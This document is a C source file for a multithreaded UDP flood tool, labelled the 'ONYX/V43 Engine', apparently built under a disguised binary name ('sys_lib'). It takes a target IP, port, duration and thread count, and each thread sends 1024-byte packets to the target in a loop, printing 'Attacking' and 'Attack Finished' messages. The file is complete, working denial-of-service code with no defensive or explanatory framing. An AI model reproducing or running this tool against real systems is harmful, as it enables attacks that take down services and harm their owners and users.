#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

// ONYX ENGINE SETTINGS
struct target_info {
    char ip[16];
    int port;
    int duration;
};

void *send_packets(void *arg) {
    struct target_info *target = (struct target_info *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    
    if (sock < 0) return NULL;

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target->port);
    dest.sin_addr.s_addr = inet_addr(target->ip);

    // High-performance payload
    char payload[1024]; 
    memset(payload, 0xFF, sizeof(payload)); 

    time_t end_time = time(NULL) + target->duration;
    
    while (time(NULL) < end_time) {
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&dest, sizeof(dest));
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    // Usage: ./sys_lib <IP> <PORT> <TIME> <THREADS>
    if (argc < 4) {
        printf("Usage: %s <ip> <port> <time> [threads]\n", argv[0]);
        return 1;
    }

    struct target_info target;
    strncpy(target.ip, argv[1], 15);
    target.port = atoi(argv[2]);
    target.duration = atoi(argv[3]);
    
    int thread_count = (argc > 4) ? atoi(argv[4]) : 10; // Default 10 threads
    pthread_t threads[thread_count];

    printf("🚀 V43 Engine: Attacking %s:%d for %ds\n", target.ip, target.port, target.duration);

    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, send_packets, &target);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("✅ Attack Finished.\n");
    return 0;
}